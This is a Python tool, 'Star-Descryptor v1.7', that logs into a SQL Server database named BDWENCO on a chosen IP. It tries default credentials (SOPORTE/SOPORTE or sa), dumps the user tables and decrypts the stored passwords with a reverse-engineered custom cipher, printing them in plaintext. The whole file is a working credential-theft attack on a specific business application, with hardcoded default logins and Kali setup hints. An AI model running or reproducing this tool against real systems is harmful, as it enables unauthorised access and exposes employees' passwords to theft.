# -*- coding: utf-8 -*-
import sys
import getpass

BANNER = """
 ****    ****    *    ****      ****   ****    ****   ****   *   *  ****   ****   ****
 *       *      * *   *  *     *   *  *      *      *       *   *  *   *  *   *  *   
 ****    *     *   *  ****     *   *  ****   ****   *       *****  ****   *   *  ****
    *    *    *******  *  *    *   *  *         *   *       *   *  *  *   *   *  *   
 ****    *   *       * *   *   ****   ****  ****     ****   *   *  *   *  ****   ****
"""

# Colores ANSI
VERDE   = "\033[92m"
AMARILLO= "\033[93m"
ROJO    = "\033[91m"
CYAN    = "\033[96m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

def print_banner():
    linea = "=" * 90
    print(CYAN + linea + RESET)
    print(CYAN + BANNER + RESET)
    print(BOLD + "       >> Star-Descryptor v1.7  |  by mr.r360  |  remoto360.com <<" + RESET)
    print(CYAN + linea + RESET)
    print()

def ok(msg):   print(f"{VERDE}[+]{RESET} {msg}")
def info(msg): print(f"{AMARILLO}[~]{RESET} {msg}")
def err(msg):  print(f"{ROJO}[!]{RESET} {msg}")

# ─────────────────────────────────────────────
#  ALGORITMO DE DESCIFRADO
# ─────────────────────────────────────────────
def descifrar(texto_cifrado):
    bytes_cifrados = texto_cifrado.encode('latin-1')
    resultado = []
    for i, byte_val in enumerate(bytes_cifrados):
        pos = i % 8
        bloque_inicio = (i // 8) * 8
        c1_val = bytes_cifrados[bloque_inicio + 1] if len(bytes_cifrados) > bloque_inicio + 1 else 0
        llave_dinamica = 5 - (c1_val % 10)
        if pos == 0:
            origen = byte_val + 5
        elif pos == 1 or pos == 3:
            origen = byte_val + 36
        elif pos == 2 or pos == 4:
            origen = byte_val + llave_dinamica
        elif pos == 5:
            origen = byte_val + 32
        elif pos == 6:
            origen = byte_val // 2
        elif pos == 7:
            origen = byte_val + 37
        resultado.append(chr(origen % 256))
    return "".join(resultado)


# ─────────────────────────────────────────────
#  RECOLECCIÓN DE PARÁMETROS AL INICIO
# ─────────────────────────────────────────────
def pedir_parametros():
    print(BOLD + "  [ CONFIGURACIÓN DE CONEXIÓN ]" + RESET)
    print()

    # IP
    ip = input("  IP del servidor          : ").strip()
    if not ip:
        err("IP requerida.")
        sys.exit(1)

    # Instancia
    print()
    print("  Instancia SQL Server:")
    print("  [1] Sin instancia (por defecto)")
    print("  [2] SQLEXPRESS")
    print("  [3] Ingresar manualmente")
    op_inst = input("  Opción [1/2/3]           : ").strip()
    if op_inst == "2":
        instancia = "SQLEXPRESS"
    elif op_inst == "3":
        instancia = input("  Nombre de instancia      : ").strip() or None
    else:
        instancia = None

    # Credenciales
    print()
    print("  Credenciales SQL Server:")
    print("  [1] SOPORTE / SOPORTE (por defecto)")
    print("  [2] sa / (ingresar contraseña)")
    print("  [3] Ingresar usuario y contraseña manualmente")
    op_cred = input("  Opción [1/2/3]           : ").strip()

    if op_cred == "2":
        sql_user = "sa"
        sql_pass = getpass.getpass("  Contraseña sa            : ")
    elif op_cred == "3":
        sql_user = input("  Usuario                  : ").strip()
        sql_pass = getpass.getpass("  Contraseña               : ")
    else:
        sql_user = "SOPORTE"
        sql_pass = "SOPORTE"

    return ip, instancia, sql_user, sql_pass


# ─────────────────────────────────────────────
#  CONEXIÓN
# ─────────────────────────────────────────────
def conectar(ip, sql_user, sql_pass, instancia=None):
    try:
        import pyodbc
    except ImportError:
        err("pyodbc no está instalado.")
        print("    Ejecuta : apt-get install -y python3-pyodbc")
        print("    En Kali : pip3 install pyodbc --break-system-packages")
        sys.exit(1)

    servidor = f"{ip}\\{instancia}" if instancia else ip
    drivers = [
        "ODBC Driver 18 for SQL Server",
        "ODBC Driver 17 for SQL Server",
        "ODBC Driver 13 for SQL Server",
    ]
    conn_str_base = (
        f"SERVER={servidor};DATABASE=BDWENCO;"
        f"UID={sql_user};PWD={sql_pass};"
        "TrustServerCertificate=yes;Connection Timeout=6;"
    )
    for driver in drivers:
        try:
            conn = pyodbc.connect(f"DRIVER={{{driver}}};" + conn_str_base)
            inst_str = f"\\{instancia}" if instancia else ""
            ok(f"Conectado a {ip}{inst_str} | usuario: {sql_user} | driver: {driver}")
            return conn
        except pyodbc.Error:
            continue
    return None


# ─────────────────────────────────────────────
#  LEER TABLAS
# ─────────────────────────────────────────────
def tabla_existe(conn, nombre):
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='BDWENCO' AND TABLE_SCHEMA='dbo' AND TABLE_NAME=?", nombre)
    return cur.fetchone()[0] > 0

def leer_tabla(conn, tabla):
    cur = conn.cursor()
    if tabla == "USUARIO":
        cur.execute("SELECT USU_CODIGO, EMP_CODIGO, USU_NOMBRE, USU_PASSWORD FROM BDWENCO.dbo.USUARIO ORDER BY USU_CODIGO")
        cols = ["USU_CODIGO", "EMP_CODIGO", "USU_NOMBRE", "USU_PASSWORD"]
    else:
        cur.execute("SELECT USU_CODIGO, USU_NOMBRE, USU_PASSWORD, USU_CARGO, USU_ESTADO, USU_TIPO FROM BDWENCO.dbo.USUARIOS ORDER BY USU_CODIGO")
        cols = ["USU_CODIGO", "USU_NOMBRE", "USU_PASSWORD", "USU_CARGO", "USU_ESTADO", "USU_TIPO"]
    return cur.fetchall(), cols


# ─────────────────────────────────────────────
#  MOSTRAR RESULTADOS CON COLOR
# ─────────────────────────────────────────────
def mostrar_tabla(filas, cols, titulo):
    if not filas:
        info(f"Tabla {titulo} sin registros.")
        return

    pwd_idx = cols.index("USU_PASSWORD")
    col_w = []
    for c in cols:
        col_w.append(26 if c in ("USU_NOMBRE", "USU_CARGO") else 14)
    col_w[pwd_idx] = 22
    col_w_full = col_w + [22]
    headers = cols + ["PWD DESCIFRADO"]

    sep = "─" * (sum(col_w_full) + len(col_w_full) * 3 + 1)

    print()
    print(BOLD + CYAN + f"  ╔══ {titulo} ({len(filas)} registros) ══╗" + RESET)
    print(sep)
    print(" " + BOLD + " | ".join(h.ljust(col_w_full[i]) for i, h in enumerate(headers)) + RESET)
    print(sep)

    for row in filas:
        valores = [str(v or "").strip() for v in row]
        pwd_enc = valores[pwd_idx]
        try:
            pwd_dec = descifrar(pwd_enc) if pwd_enc else "(vacío)"
        except Exception as e:
            pwd_dec = f"[ERR:{e}]"

        fila_display = valores + [pwd_dec]
        partes = []
        for i, v in enumerate(fila_display):
            celda = str(v).ljust(col_w_full[i])[:col_w_full[i]]
            if i == len(fila_display) - 1:
                # Contraseña descifrada en verde y negrita
                partes.append(VERDE + BOLD + celda + RESET)
            elif i == pwd_idx:
                # Password cifrado en amarillo
                partes.append(AMARILLO + celda + RESET)
            else:
                partes.append(celda)
        print(" " + " | ".join(partes))

    print(sep)
    print()


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
print_banner()

ip, instancia, sql_user, sql_pass = pedir_parametros()

print()
info(f"Conectando a {ip}" + (f"\\{instancia}" if instancia else "") + " ...")

conn = conectar(ip, sql_user, sql_pass, instancia)
if not conn:
    err("Conexión fallida. Verifica IP, instancia, credenciales, firewall o puerto 1433.")
    sys.exit(1)

try:
    print()
    info("Buscando tablas de usuarios en BDWENCO...")

    encontrado = False
    for tabla in ["USUARIO", "USUARIOS"]:
        if tabla_existe(conn, tabla):
            filas, cols = leer_tabla(conn, tabla)
            if filas:
                encontrado = True
                mostrar_tabla(filas, cols, tabla)
            else:
                info(f"Tabla {tabla} existe pero está vacía.")

    if not encontrado:
        err("No se encontraron datos en USUARIO ni USUARIOS.")

    print(BOLD + f"[+] Star-Descryptor v1.7 — remoto360.com" + RESET)
    print()

except Exception as e:
    err(f"Error: {e}")
finally:
    conn.close()
